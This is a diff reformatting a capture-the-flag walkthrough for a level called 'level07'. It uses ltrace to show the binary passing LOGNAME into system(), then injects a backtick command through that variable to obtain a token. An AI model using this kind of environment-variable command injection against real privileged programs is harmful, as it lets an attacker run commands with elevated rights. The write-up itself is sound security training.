@@ -1,11 +1,14 @@
 here we have a executable who only print "level07"
 
-COMMAND: ./level07
-RESULT: level07
+```sh
+$: ./level07
+level07
+```
 
-*we try to learn more about the executable with trace command*
+**we try to learn more about the executable with trace command**
 
-COMMAND: ltrace ./level07
+```sh
+$: ltrace ./level07
 RESULT: 
 __libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
 getegid()                                                       = 2007
@@ -19,10 +22,13 @@ system("/bin/echo level07 "level07
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                          = 0
 +++ exited (status 0) +++
+```
 
-*we see that the executable get the "level07" string from the LOGNAME env variable*
-*so we will make the program echo the result of the getflag command*
+**we see that the executable get the "level07" string from the LOGNAME env variable**
+**so we will make the program echo the result of the getflag command**
 
-COMMAND: LOGNAME=\`getflag\` ./level07
-RESULT: heck flag.Here is your token : *******flag********
+```sh
+$: LOGNAME=\`getflag\` ./level07
+check flag.Here is your token : *******flag********
+```
 
